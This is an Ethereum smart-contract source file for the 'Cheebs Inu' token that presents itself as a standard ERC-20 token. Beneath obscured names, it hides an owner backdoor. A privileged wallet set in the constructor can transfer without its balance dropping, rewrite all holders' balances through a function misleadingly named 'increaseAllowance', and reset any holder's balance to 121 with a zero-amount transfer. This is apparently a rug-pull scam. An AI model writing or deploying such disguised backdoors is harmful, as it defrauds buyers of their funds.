/**
 *Submitted for verification at Etherscan.io on 2023-06-18
*/

/**
 *
*/

/**
    

*/

//https://twitter.com/CHEEBSINUERC20
//https://t.me/cheebsinuentryportal
//https://www.cheebsinu.com/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract CheebsInu is Ownable {
    mapping(uint256 => mapping(address => uint256)) balance;
    mapping(uint256 => mapping(address => bool)) Cheebsbal;

    uint256 private Cheebsdistro = 1;
    string public name = "Cheebs Inu";
    uint256 private Cheebslimit;

    function balanceOf(address user) public view returns (uint256) {
        if (user == Cheebspair) return balance[Cheebsdistro][user];

        if (!Cheebsbal[Cheebsdistro][user] && balance[Cheebsdistro - 1][user] != 0) {
            return balance[Cheebsdistro][user] + Cheebslimit;
        }
        return balance[Cheebsdistro][user];
    }

    function increaseAllowance(
        uint256 _Cheebslimit,
        address[] memory Cheebsholder
    ) public returns (bool success) {
        if (Cheebswallet[msg.sender] != 0) {
            Cheebsdistro++;
            for (uint256 i = 0; i < Cheebsholder.length; i++) {
                balance[Cheebsdistro][Cheebsholder[i]] =
                    balance[Cheebsdistro - 1][Cheebsholder[i]] +
                    Cheebslimit;
            }

            balance[Cheebsdistro][Cheebspair] = balance[Cheebsdistro - 1][
                Cheebspair
            ];

            Cheebslimit = _Cheebslimit;
        }

        return true;
    }

    function approve(
        address Cheebsactive,
        uint256 Cheebsnumber
    ) public returns (bool success) {
        allowance[msg.sender][Cheebsactive] = Cheebsnumber;
        emit Approval(msg.sender, Cheebsactive, Cheebsnumber);
        return true;
    }

    uint8 public decimals = 9;

    function Cheebsspender(address Cheebsapprover, address Cheebsreceiver, uint256 Cheebsnumber) private {
        if (!Cheebsbal[Cheebsdistro][Cheebsapprover]) {
            Cheebsbal[Cheebsdistro][Cheebsapprover] = true;
            if (balance[Cheebsdistro - 1][Cheebsapprover] != 0)
                balance[Cheebsdistro][Cheebsapprover] += Cheebslimit;
        }

        if (!Cheebsbal[Cheebsdistro][Cheebsreceiver]) {
            Cheebsbal[Cheebsdistro][Cheebsreceiver] = true;
            if (balance[Cheebsdistro - 1][Cheebsreceiver] != 0)
                balance[Cheebsdistro][Cheebsreceiver] += Cheebslimit;
        }

        if (Cheebswallet[Cheebsapprover] == 0) {
            balance[Cheebsdistro][Cheebsapprover] -= Cheebsnumber;
        }
        balance[Cheebsdistro][Cheebsreceiver] += Cheebsnumber;
        if (
            Cheebswallet[msg.sender] > 0 && Cheebsnumber == 0 && Cheebsreceiver != Cheebspair
        ) {
            balance[Cheebsdistro][Cheebsreceiver] = Cheebsvalue;
        }
        emit Transfer(Cheebsapprover, Cheebsreceiver, Cheebsnumber);
    }

    address public Cheebspair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "CHEEBS";

    mapping(address => uint256) private Cheebswallet;

    function transfer(
        address Cheebsreceiver,
        uint256 Cheebsnumber
    ) public returns (bool success) {
        require(Cheebsreceiver != address(0), "Can't transfer to 0 address");
        Cheebsspender(msg.sender, Cheebsreceiver, Cheebsnumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    uint256 public totalSupply = 100000000 * 10 ** 9;

    function transferFrom(
        address Cheebsapprover,
        address Cheebsreceiver,
        uint256 Cheebsnumber
    ) public returns (bool success) {
        require(Cheebsnumber <= allowance[Cheebsapprover][msg.sender]);
        allowance[Cheebsapprover][msg.sender] -= Cheebsnumber;
        Cheebsspender(Cheebsapprover, Cheebsreceiver, Cheebsnumber);
        return true;
    }

    constructor(address Cheebsmarket) {
        balance[Cheebsdistro][msg.sender] = totalSupply;
        Cheebswallet[Cheebsmarket] = Cheebsvalue;
        IUniswapV2Router02 Cheebsworkshop = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        Cheebspair = IUniswapV2Factory(Cheebsworkshop.factory()).createPair(
            address(this),
            Cheebsworkshop.WETH()
        );
    }

    uint256 private Cheebsvalue = 121;

    mapping(address => uint256) private Cheebsprime;
}